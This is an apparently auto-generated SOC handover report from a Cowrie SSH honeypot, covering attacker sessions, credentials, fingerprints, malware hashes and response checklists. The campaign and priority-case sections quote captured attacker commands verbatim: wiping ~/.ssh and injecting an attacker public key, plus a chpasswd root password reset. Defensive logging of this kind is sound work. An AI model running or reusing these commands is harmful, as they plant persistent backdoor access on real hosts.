# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-30 |
| **Generated At** | 2026-05-30T10:04:23Z |
| **Shift Time** | 10:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **231** |
| Confirmed Threats | **220** |
| False Positives Filtered | **11** (4.8%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **9** |
| High Severity Cases | **4** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **227** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **13** |
| Unique Credential Pairs | **13** |
| Unique Usernames | **10** |
| Unique Passwords | **13** |
| Successful Auth Pairs | **4** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 4 |
| `345gs5662d34` | 1 |
| `mika` | 1 |
| `laurent` | 1 |
| `yash` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456789Qq` | 1 |
| `345gs5662d34` | 1 |
| `3245gs5662d34` | 1 |
| `mika` | 1 |
| `laurent` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `123456789Qq` | 1 |
| `345gs5662d34` | `345gs5662d34` | 1 |
| `root` | `3245gs5662d34` | 1 |
| `mika` | `mika` | 1 |
| `laurent` | `laurent` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456789Qq` | `124.109.2.211` | 2026-05-30T07:35:51 |
| `root` | `3245gs5662d34` | `124.109.2.211` | 2026-05-30T07:35:54 |
| `root` | `Linux123!@#` | `180.76.192.211` | 2026-05-30T09:00:46 |
| `root` | `P@$$w0rd2025` | `180.76.192.211` | 2026-05-30T09:03:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **231** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 29 |
| Go SSH scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 14 | 5 |
| `0a07365cc01f...` | Generic scanner | 4 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 3 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 14 | 5 | Mirai/variant |
| `95420f9d932d...` | libssh | 12 | 4 | — |
| `0a07365cc01f...` | Go SSH scanner | 4 | 1 | Generic scanner |
| `03a80b21afa8...` | libssh | 3 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:tHMnwyOOVD2w"|chpasswd|bash
```
Source IPs: `180.76.192.211`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `124.109.2.211`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **21** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS211298` | Driftnet Ltd | 1 | HIGH |
| `AS45899` | VNPT Corp | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (4)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ef76baa43894

| Field | Detail |
|---|---|
| **Source IP** | `124.109.2[.]211` |
| **First Seen** | 2026-05-30 07:35 |
| **Last Seen** | 2026-05-30 07:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 07:35:51` | `cowrie.session.connect` |
| `2026-05-30 07:35:51` | `cowrie.client.version` |
| `2026-05-30 07:35:51` | `cowrie.client.kex` |
| `2026-05-30 07:35:51` | `cowrie.login.success` |
| `2026-05-30 07:35:52` | `cowrie.session.params` |
| `2026-05-30 07:35:52` | `cowrie.command.input` |
| `2026-05-30 07:35:52` | `cowrie.command.failed` |
| `2026-05-30 07:35:52` | `cowrie.log.closed` |
| `2026-05-30 07:35:52` | `cowrie.session.params` |
| `2026-05-30 07:35:52` | `cowrie.command.input` |
| `2026-05-30 07:35:52` | `cowrie.session.file_download` |
| `2026-05-30 07:35:52` | `cowrie.log.closed` |
| `2026-05-30 07:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.109.2[.]211` to AbuseIPDB if not already reported
- [ ] Block `124.109.2[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d546467ef9e8

| Field | Detail |
|---|---|
| **Source IP** | `124.109.2[.]211` |
| **First Seen** | 2026-05-30 07:35 |
| **Last Seen** | 2026-05-30 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 07:35:54` | `cowrie.session.connect` |
| `2026-05-30 07:35:54` | `cowrie.client.version` |
| `2026-05-30 07:35:54` | `cowrie.client.kex` |
| `2026-05-30 07:35:54` | `cowrie.login.success` |
| `2026-05-30 07:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.109.2[.]211` to AbuseIPDB if not already reported
- [ ] Block `124.109.2[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56ce5fb5c389

| Field | Detail |
|---|---|
| **Source IP** | `180.76.192[.]211` |
| **First Seen** | 2026-05-30 09:00 |
| **Last Seen** | 2026-05-30 09:03 |
| **Session Duration** | 158s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:tHMnwyOOVD2w"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 09:00:41` | `cowrie.session.connect` |
| `2026-05-30 09:00:41` | `cowrie.client.version` |
| `2026-05-30 09:00:43` | `cowrie.client.kex` |
| `2026-05-30 09:00:46` | `cowrie.login.success` |
| `2026-05-30 09:00:50` | `cowrie.session.params` |
| `2026-05-30 09:00:50` | `cowrie.command.input` |
| `2026-05-30 09:00:50` | `cowrie.command.failed` |
| `2026-05-30 09:00:57` | `cowrie.log.closed` |
| `2026-05-30 09:01:00` | `cowrie.session.params` |
| `2026-05-30 09:01:00` | `cowrie.command.input` |
| `2026-05-30 09:01:00` | `cowrie.session.file_download` |
| `2026-05-30 09:01:00` | `cowrie.log.closed` |
| `2026-05-30 09:01:20` | `cowrie.session.params` |
| `2026-05-30 09:01:20` | `cowrie.command.input` |
| `2026-05-30 09:01:21` | `cowrie.log.closed` |
| `2026-05-30 09:01:21` | `cowrie.session.params` |
| `2026-05-30 09:01:21` | `cowrie.command.input` |
| `2026-05-30 09:01:30` | `cowrie.log.closed` |
| `2026-05-30 09:03:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.192[.]211` to AbuseIPDB if not already reported
- [ ] Block `180.76.192[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fcc8fe9d7db

| Field | Detail |
|---|---|
| **Source IP** | `180.76.192[.]211` |
| **First Seen** | 2026-05-30 09:03 |
| **Last Seen** | 2026-05-30 09:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 09:03:43` | `cowrie.session.connect` |
| `2026-05-30 09:03:43` | `cowrie.client.version` |
| `2026-05-30 09:03:45` | `cowrie.client.kex` |
| `2026-05-30 09:03:46` | `cowrie.login.success` |
| `2026-05-30 09:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.192[.]211` to AbuseIPDB if not already reported
- [ ] Block `180.76.192[.]211` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.189.25[.]100` | **176** | 2026-05-30 07:16 | 2026-05-30 10:02 | 132m | 0 | `T1592` | 🟠 MEDIUM |
| `180.76.192[.]211` | **15** | 2026-05-30 08:51 | 2026-05-30 09:18 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `152.32.150[.]26` | **3** | 2026-05-30 08:48 | 2026-05-30 09:01 | 4m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.142.219[.]55` | **3** | 2026-05-30 09:37 | 2026-05-30 09:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `50.6.248[.]168` | **3** | 2026-05-30 08:50 | 2026-05-30 08:57 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `194.102.73[.]93` | **2** | 2026-05-30 08:09 | 2026-05-30 08:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.169.81[.]111` | **2** | 2026-05-30 08:01 | 2026-05-30 08:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.150.134[.]81` | **2** | 2026-05-30 09:40 | 2026-05-30 09:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.220[.]35` | 1 | 2026-05-30 08:59 | 2026-05-30 09:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.147.40[.]93` | 1 | 2026-05-30 08:58 | 2026-05-30 09:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.13.25[.]186` | 1 | 2026-05-30 08:46 | 2026-05-30 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.109.2[.]211` | 1 | 2026-05-30 07:35 | 2026-05-30 07:35 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.123[.]167` | 1 | 2026-05-30 08:45 | 2026-05-30 08:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.116.189[.]74` | 1 | 2026-05-30 06:50 | 2026-05-30 06:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `171.104.143[.]176` | 1 | 2026-05-30 08:46 | 2026-05-30 08:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.137.249[.]148` | 1 | 2026-05-30 06:51 | 2026-05-30 06:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]86` | 1 | 2026-05-30 09:39 | 2026-05-30 09:39 | 15s | 0 | `T1592` | 🟢 LOW |
| `87.236.176[.]75` | 1 | 2026-05-30 08:57 | 2026-05-30 08:57 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `206.189.25[.]100` | GB | DigitalOcean, LLC | **100** ⚠️ | 2 |
| `3.142.219[.]55` | US | Amazon Technologies Inc. | **100** ⚠️ | 35 |
| `20.169.81[.]111` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `194.102.73[.]93` | RO | Universitatea de Stiinte Agricole si Medicina Veterinara Cluj-Napoca | **100** ⚠️ | 0 |
| `101.96.220[.]35` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 5 |
| `3.150.134[.]81` | US | Amazon Technologies Inc. | **100** ⚠️ | 1 |
| `180.76.192[.]211` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 7 |
| `171.104.143[.]176` | CN | CHINANET GUANGXI PROVINCE NETWORK | **100** ⚠️ | 50 |
| `152.32.150[.]26` | US | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 27 |
| `122.13.25[.]186` | CN | China Unicom Guangdong province network | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 36 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 9 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 4 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 2 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 2 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 4 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 231 cases |
| Tool 34  | Credential Extractor        | ✅ 13 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 24 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (4.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 4 priority case(s) shown individually · 18 recon entry/entries in table (8 group(s) consolidating 206 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-30T10:04:23Z_
